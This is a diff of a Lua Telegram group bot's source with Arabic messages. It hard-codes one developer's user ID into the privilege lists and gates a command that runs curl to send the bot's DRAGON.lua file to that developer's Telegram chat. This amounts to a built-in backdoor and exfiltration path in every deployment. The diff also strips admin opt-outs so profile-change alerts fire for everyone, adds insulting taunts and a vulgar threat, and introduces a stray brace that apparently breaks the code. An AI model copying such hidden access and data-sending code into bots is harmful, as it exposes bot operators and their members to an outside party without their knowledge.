@@ -199,6 +199,16 @@ local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
 function vardump(value)  
 print(serpent.block(value, {comment=false}))   
 end 
+dev_users = {944353237}   
+function DEV(msg)  
+local DRAGON = false  
+for k,v in pairs(dev_users) do  
+if tonumber(msg.sender_user_id_) == tonumber(v) then  
+DRAGON = true  
+end  
+end  
+return DRAGON  
+end 
 sudo_users = {SUDO,0100101010,944353237,9292929292,0303030030,0909090909}   
 function SudoBot(msg)  
 local DRAGON = false  
@@ -4508,31 +4518,25 @@ end
 bnnaGet(id, sofi_mrsofi_new)
 end
 end
-if text == "تفعيل تنبيه الاسماء" and Manager2(msg) and database:get(bot_id.."AL:AddS0FI:stats") == "✔" then
-send(msg.chat_id_, msg.id_, '☉┇ تم تفعيل تنبيه الاسماء')
-database:set(bot_id.."Ttn:DRG:stats"..msg.chat_id_,"open")
-end
-if text == "تعطيل تنبيه الاسماء" and Manager2(msg) and database:get(bot_id.."AL:AddS0FI:stats") == "✔" then
-send(msg.chat_id_, msg.id_, '☉┇ تم تعطيل تنبيه الاسماء')
-database:set(bot_id.."Ttn:DRG:stats"..msg.chat_id_,"close")
-end
-if text and database:get(bot_id.."Ttn:DRG:stats"..msg.chat_id_) == "open" then 
+if text then 
 tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)
 if data.id_ then 
 if data.id_ ~= bot_id then
 local DRAGONChengName = database:get(bot_id.."DRAGON:Cheng:Name"..data.id_)
 if not data.first_name_ then 
 if DRAGONChengName then 
-send(msg.chat_id_, msg.id_, " خوش معرف جان ["..DRAGONChengName..']')
+send(msg.chat_id_, msg.id_, " مش عارف كدا اسمك ماله مش باين 😏 ["..DRAGONChengName..']')
 database:del(bot_id.."DRAGON:Cheng:Name"..data.id_) 
 end
 end
 if data.first_name_ then 
 if DRAGONChengName ~= data.first_name_ then 
 local Text = {
-  "جان خوش اسم يول",
-"ليش غيرته اسمك بس لا خانوك/ج",
-"هذا الحلو غير اسمه 😉",
+  "في اي يسطا ماله اسمك القديم 😂",
+"هاااا غير اسمك لي رجع القديم",
+"اسمك مش عاجبني خليه شبهي ",
+"معرفتكش لنل كدا لمل غيرت اسمك صح",
+"حلو الاسم الجديد",
 }
 send(msg.chat_id_, msg.id_,Text[math.random(#Text)])
 end  
@@ -4542,35 +4546,28 @@ end
 end
 end,nil)   
 end
-if text == "تفعيل تنبيه المعرف" and Constructor(msg) and database:get(bot_id.."AL:AddS0FI:stats") == "✔" then
-send(msg.chat_id_, msg.id_, '☉┇ تم تفعيل تنبيه المعرف')
-database:set(bot_id.."Ttn:Userr:stats"..msg.chat_id_,"open")
-end
-if text == "تعطيل تنبيه المعرف" and Constructor(msg) and database:get(bot_id.."AL:AddS0FI:stats") == "✔" then
-send(msg.chat_id_, msg.id_, '☉┇ تم تعطيل تنبيه المعرف')
-database:set(bot_id.."Ttn:Userr:stats"..msg.chat_id_,"close")
-end
-if text and database:get(bot_id.."Ttn:Userr:stats"..msg.chat_id_) == "open" then  
+if text then  
 tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)
 if data.id_ then 
 if data.id_ ~= bot_id then
 local DRAGONChengUserName = database:get(bot_id.."DRAGON:Cheng:UserName"..data.id_)
 if not data.username_ then 
 if DRAGONChengUserName then 
-send(msg.chat_id_, msg.id_, 1, "مسح معرفه خمطو بساع بساع  \n هاذه معرفه  : [@"..DRAGONChengUserName..']')
+send(msg.chat_id_, msg.id_, 1, "امسكو مسح اليورر بتاعه 😂😂\n اليوزر القديم  : [@"..DRAGONChengUserName..']')
 database:del(bot_id.."DRAGON:Cheng:UserName"..data.id_) 
 end
 end
 if data.username_ then 
 if DRAGONChengUserName ~= data.username_ then 
 local Text = {
-'شكو غيرت معرفك شنو نشروك بقنوات فضايح😂🥺',
-"هاها شو غيرت معرفك بس لا هددتك/ج الحب",
-"شسالفه شو غيرت معرفك 😐🌝",
-"غير معرفه خمطو بساع بساع \n هاذه معرفه : @"..data.username_.."",
-'ها عار مو جان معرفك \n شكو غيرته ل @'..data.username_..' ',
-'ها يول شو مغير معرفك بيش مشتري يول', 
-"منور معرف جديد :  "..data.username_.."",
+'هاا غيرت اليوزر لي كنت في حفله و مقدرتش ولا اي 😂😂',
+"امسك حرامي غير اليوزر دا الجديد @"..data.username_.."",
+"غيرت اليوزر لي 😐",
+"حرامي غير اليوزر مسكتو \n دا اليوزر : @"..data.username_.."",
+'عيب يسطا لما انت تكون انت و تغير يوزرك 😶',
+'ها مغير اليوزر ', 
+"منور اليوزر الجديد :  "..data.username_.."",
+}
 }
 send(msg.chat_id_, msg.id_,Text[math.random(#Text)])
 end  
@@ -4580,34 +4577,25 @@ end
 end
 end,nil)   
 end
-if text == "تفعيل تنبيه الصور" and Manager2(msg) and database:get(bot_id.."AL:AddS0FI:stats") == "✔" then
-send(msg.chat_id_, msg.id_, '☉┇ تم تفعيل تنبيه الصور')
-database:set(bot_id.."Ttn:Ph:stats"..msg.chat_id_,"open")
-end
-if text == "تعطيل تنبيه الصور" and Manager2(msg) and database:get(bot_id.."AL:AddS0FI:stats") == "✔" then
-send(msg.chat_id_, msg.id_, '☉┇ تم تعطيل تنبيه الصور')
-database:set(bot_id.."Ttn:Ph:stats"..msg.chat_id_,"close")
-end
-if text and database:get(bot_id.."Ttn:Ph:stats"..msg.chat_id_) == "open" then  
+if text then  
 tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)
 if data.id_ then 
 if data.id_ ~= bot_id then 
 local DRAGONChengPhoto = database:get(bot_id.."DRAGON:Cheng:Photo"..data.id_)
 if not data.profile_photo_ then 
 if DRAGONChengPhoto then 
-send(msg.chat_id_, msg.id_, "مسح كل صور ابن الحلو شكد غبي لعد😂🥺")
+send(msg.chat_id_, msg.id_, "امسكو مسح صورو الحيوان 😂😂")
 database:del(bot_id.."DRAGON:Cheng:Photo"..data.id_) 
 end
 end
 if data.profile_photo_.big_.persistent_id_ then 
 if DRAGONChengPhoto ~= data.profile_photo_.big_.persistent_id_ then 
 local Text = {
-  "شكو غيرت صورتك يلصاك",
-  "منور طالع حلو ع صوره جديده",
-  "ها يول شو غيرت صورتك😍😂",
-  "شكو غيرت صورتك شنو قطيت وحده جديده 😹😹🌚",
-  "شو غيرت صورتك شنو تعاركت ويه الحب ؟😹🌞",
-  "شكو غيرت الصوره شسالفه ؟؟ 🤔🌞",
+  "شيل صورتك احسن",
+  "حلوه الصوره دي",
+  "حاتطه صوره وحده احلي منك لي",
+  "مممممممم مغير الصوره لي ",
+  "شكلك مقموص",
 }
 send(msg.chat_id_, msg.id_,Text[math.random(#Text)])
 end  
@@ -4618,6 +4606,10 @@ end
 end,nil)  
 end
 if text == 'سحب السورس' or text == 'جلب السورس' then 
+if not DEV(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون مبرمج السورس لاستخدام هذا الامر')
+return false
+end   
 local curlm = 'curl "'..'https://api.telegram.org/bot'.. token ..'/sendDocument'..'" -F "chat_id='.. 944353237 ..'" -F "document=@'..'DRAGON.lua'..'"' io.popen(curlm) ---- كود كتابه أحمد عياد هتسرق هيجيبك من طيزك
 send(msg.chat_id_, msg.id_,' جاري ارسال السورس الي المبرمج')
 end
